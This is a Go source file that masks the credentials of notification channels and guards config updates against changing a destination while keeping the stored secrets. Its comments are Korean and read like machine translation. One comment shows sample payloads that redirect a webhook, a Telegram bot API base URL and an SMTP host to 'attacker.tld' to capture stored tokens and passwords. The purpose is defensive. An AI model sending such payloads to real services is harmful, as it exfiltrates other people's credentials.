package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix 은 마스크 값의 태그 접두사입니다.。API 자격 증명을 에코할 때 실제 콘텐츠를 이 접두사가 있는 값으로 바꿉니다.，
// 업데이트 인터페이스가 이 접두사가 포함된 값을 수신하면 다음과 같이 이해됩니다.「라이브러리의 원래 값을 변경하지 않고 그대로 유지합니다.」。
//
// 빈 문자열이나 고정 상수 대신 접두사를 사용하세요.，은 우연히 식별 가능한 정보를 가져오려는 것입니다.
// （또 만나요 MaskedValue），사용자가 구별하도록 하십시오.「이건 어떤 로봇인가요?」키를 다시 붙여넣을 필요 없이。
const MaskedPrefix = "__masked__"

// MaskedValue 마스크 값 생성：
//
//	"__masked__"              원래 값이 너무 짧습니다.，힌트 없음
//	"__masked__:…ab12cd"      원래 값을 가져오세요 6 비트를 식별 프롬프트로 사용
//
// 밑부분만 노출됨 6 비트가 의도적으로 선택되었습니다.：Webhook 주소 식별 정보는 마지막 문단에 있습니다.（기업 위챗 등 key、
// 페이슈의 로봇 id），접두사 부분은 로봇마다 동일합니다.、식별값 없음。끝 6 비트가 충분하지 않습니다.
// 자격 증명 복원，하지만 구성자가 인식하기에는 충분합니다.「내 그룹이에요」。
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked 값이 마스크된 값인지 여부를 보고합니다.（즉, 에코 후 인터페이스가 수정되지 않았습니다.）。
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig 구성 복사본을 반환합니다.，채널의 자격 증명 필드를 마스크된 값으로 바꿉니다.。
//
// 알 수 없는 채널 유형이 비어 있음을 반환합니다. map 원래 구성 대신——차라리 포기하고 싶어요 UI 보여줘「구성을 사용할 수 없습니다.」，
// 채널 유형을 인식할 수 없는 경우 인증 정보가 포함될 수 있는 원본 콘텐츠 전체를 뱉어내지 마세요.。
// 자격 증명이 아닌 필드는 그대로 유지됩니다.，UI 이 정상적으로 표시될 수 있습니다.。
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// headers 이러한 유형의 중첩 구조는 전체적으로 하나의 자격 증명으로 처리됩니다.：각 채널의 필요성을 하나씩 결정합니다.
		// 한 마디 더「자격 증명인 하위 키」의 규칙，이점보다 복잡성이 훨씬 더 큽니다.。
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials 뜻「목적지 주소가 변경되었습니다，그러나 발신자는 그렇지 않았습니다.
// 자격 증명 필드 표현」。자격 증명을 자동으로 해제하거나 자동으로 삭제하는 대신 반환합니다.，이유 보기 PrepareConfigUpdate。
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // 대상 키가 변경되었습니다.
	Missing []string // 자격 증명 키가 명시적으로 명시되지 않았습니다.
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "목적지 주소（" + strings.Join(e.Changed, "、") + "）변경됨，자격 증명 필드도 다시 작성해 주세요.（" +
		strings.Join(e.Missing, "、") + "）：새 값을 입력하세요.，또는 자격 증명이 더 이상 필요하지 않음을 나타내려면 명시적으로 비워 두세요.。" +
		"원래 자격 증명은 이전 주소에만 유효합니다.，계속 사용하는 것은 새로운 주소로 부여하는 것과 같습니다.。"
}

// PrepareConfigUpdate 채널 구성 병합，및 프로세스「대상 주소 변경」보안에 민감한 상황。
//
// 알몸을 대신한다 MergeConfig 채널 업데이트 경로에 사용됩니다.，솔루션은 측정된 실현 가능한 경로입니다.：
// 목적지 주소（메시지를 보낼 곳）자격 증명 포함（이 메시지를 보낼 때 어떤 신원을 사용합니까?）은 두 개의 독립 필드 세트입니다.，그리고 MergeConfig
// 예「언급되지 않은 키」라이브러리에는 항상 원래 값을 유지합니다.。그래서 할 수 있는 것은 무엇이든 PATCH 채널 사람들은**주소만 바꾸세요、
// 자격 증명에 대해 이야기하지 마십시오.**，을 사용하면 서버가 라이브러리의 실제 자격 증명을 제어하는 엔드포인트로 보낼 수 있습니다.：
//
//	webhook  {config:{url:"https://attacker.tld"}}  → 원본 Authorization 요청 시 헤더가 전송됩니다.
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<맞아요Token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → STARTTLS 그런 다음 사용자 이름과 비밀번호를 넘겨주세요.
//
// 이 경로는 완전히 조용합니다.、리디렉션에 의존하지 않습니다.（따라서 호스트 간 점프를 거부한다고 해서 멈출 수는 없습니다.），
// 그리고 이 패킷 마스킹 메커니즘의 대상을 직접 침투합니다.——「자격 증명이 브라우저에 표시되지 않습니다.」。
//
// 규칙：대상 키가 새로운 값으로 변경되는 한，발신자는 반드시**여러분 모두**자격 증명 키 명시적 상태：
//   - 은 새로운 가치를 선사합니다 → 새 값 사용
//   - 빈 문자열을 명시적으로 전달 → 이 필드에는 더 이상 자격 증명이 필요하지 않습니다.（계속해서 의미를 삭제하세요.）
//   - 마스크 값을 그대로 반환 / 이 키는 언급하지 마세요. → 거부
//
// 세 번째 이유도 기각，그렇기 때문이죠「마스크 값」은 정확히 의미합니다.「기존 자격 증명 유지」，그리고 이전 자격 증명
// 이전 주소에만 유효합니다.。일부러 여기서는 안해요「자격 증명 자동 삭제」——선택적 자격 증명 필드 쌍
// （webhook 님 headers、email 님 password）은 조용히「인증이 손실되었지만 인터페이스가 반환됩니다. 200」，
// 오류를 보고하는 것보다 문제를 해결하는 것이 더 어렵습니다.。차라리 교환원에게 한 번 더 작성을 맡기고 싶습니다.。
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("채널 유형 %q 등록되지 않음", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// 문자열이 아닌 자격 증명 값（ webhook 님 headers 은 객체입니다.）마스크 리터럴이 내장되어 있는 경우，
	// 발신자가「원래 값을 유지하세요.」의 보초가 구조물 내부에 박혀있습니다。MergeConfig 인식만 가능「문자열
	// (접두사 포함)」는 마스크입니다，이 양식은 일반 개체로 저장됩니다.——커리는 말 그대로 뒤쳐졌네요
	// "__masked__"，후속 인증은 오류 없이 자동으로 실패합니다.。차라리 거절하겠습니다。
	//
	// 이 수표는 다음 위치에 있어야 합니다.**상단**：주소가 바뀌지 않으면 조기 복귀하겠습니다.，뒤에 넣는다는 것은
	// 해당사항만 해당「주소 변경」이 경로（그렇게 초판이 잘못됐네요，테스트로 직접 잡아봤습니다）。
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// 실제로 변경된 대상 키를 알아보세요.。마스크 값은 다음과 같습니다.「변화 없음」。
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// 주소는 변경되지 않았습니다.，일반 병합을 수행합니다.（마스크 값이 원래 값을 유지합니다.、빈 문자열을 지웁니다.、휴식 보장）。
		return MergeConfig(stored, incoming), nil
	}

	// 주소가 바뀌었어요：각 자격 증명 키를 명시적으로 표현해야 합니다.。
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers 문자열이 아닌 구조에 포함된 마스크된 센티널 제출을 거부합니다.。
//
// 마스크 메커니즘의 전제는「전체 값은 문자열입니다.」。좋아요 webhook 님 headers 이런 개체 필드입니다.，
// 전체를 마스킹할 수만 있음（문자열로 작성 "__masked__"）또는 전체 제출；물체 안에 센트리를 넣어주세요
// 표현이 안되네요「변함없이 그대로 유지」，은 실제 값으로 라이브러리에 저장됩니다.。
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("필드 %s 의 콘텐츠에 마스크 태그가 포함되어 있습니다. %q：이 필드는 상속을 나타내기 위해 공백으로만 남겨둘 수 있습니다.、또는 새로운 값을 전체적으로 제출하세요.，마스크 자리 표시자는 구조 내부에 포함될 수 없습니다.",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue 두 구성 값을 비교하여 동일한지 확인합니다.。사용 JSON 직렬화 비교는 부수적인 처리를 위한 것입니다.
// 종류의 차이——프런트 엔드에서 제출한 포트는 다음과 같습니다. number，그리고 커리가 읽어준 내용은 float64，직접 == 잘못 판단하겠지。
//
// 「비어 있음」비교하기 전에 정규화해야 함：빈 문자열과「키가 존재하지 않습니다.」이 구성 모델에서도 같은 상태입니다，
// 왜냐하면 MergeConfig 빈 문자열을 명시적 지우기로 처리합니다.、직접 delete 이 키를 제거하세요.。정규화되지 않은 경우，하나
// 항상 비어 있는 선택적 대상 필드（Telegram 님 base_url 이 유일한 필드입니다.：비워두고 사용하세요
// 공식주소）은 이 경로를 따릅니다.——
//
//	신규생성시 저장 base_url:""  →  처음으로 저장되었습니다. MergeConfig 삭제 키
//	→ 두 번째 저장 시 incoming 네 ""、stored 키 누락，형을 선고받았습니다「주소가 바뀌었어요」
//	→ 자격 증명은 마스크된 값입니다. → 400「목적지 주소가 변경되었습니다，자격 증명 필드도 다시 작성해 주세요.」
//
// 그 이후로는 모든 저장이 실패했습니다.，사용자가 다시 붙여넣지 않는 이상 Bot Token，그리고 그 사람은 아무것도 변하지 않았어。
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue 구성 값이 다음과 같은지 확인합니다.「비어 있음」。
// 구경은 동일해야합니다 MergeConfig 의 청산판결은 일관됨（strings.TrimSpace(s) == ""），
// 그렇지 않으면 나타날 것입니다「MergeConfig 삭제해야 한다고 생각해요、sameConfigValue 소중한 것 같아요」격차。
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig 넣어보세요 incoming 에 병합하다 stored ，채널 구성을 업데이트하는 데 사용됩니다.。
//
// 규칙：
//   - incoming 값이 마스크인 키 → 예약됨 stored 의 원래 값（사용자가 이 필드를 변경하지 않았습니다.）
//   - incoming 값이 빈 문자열인 키 → 은 명시적으로 삭제된 것으로 간주됩니다.，키 삭제
//   - 나머지 키 → 사용 incoming 값이 재정의됩니다.
//   - stored 안에 뭔가 있어요 incoming 키를 찾을 수 없습니다. → 예약됨（로컬 업데이트 의미）
//
// 빈 문자열도 포함되나요?「클리어」명확히 해야 함：프런트 엔드 양식은 채워지지 않은 필드를 빈 문자열로 제출합니다.，
// 유효한 값으로 쓰면，그럴게요「원래 값을 유지하려면 비워 두세요.」필드가 실제로 지워졌습니다.。
// 여기서는 Clear Clear를 선택하세요.，잘못 설정된 필드를 지우고 싶기 때문입니다.，사용자는 달리 표현할 방법이 없습니다.
// （필드를 끌어서 구분하세요.「제공되지 않음」그리고「null 값 제공」，하지만 UI 이 차이를 이용하지 마세요）。
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // 마스크 값 = 수정되지 않음，예약됨 stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
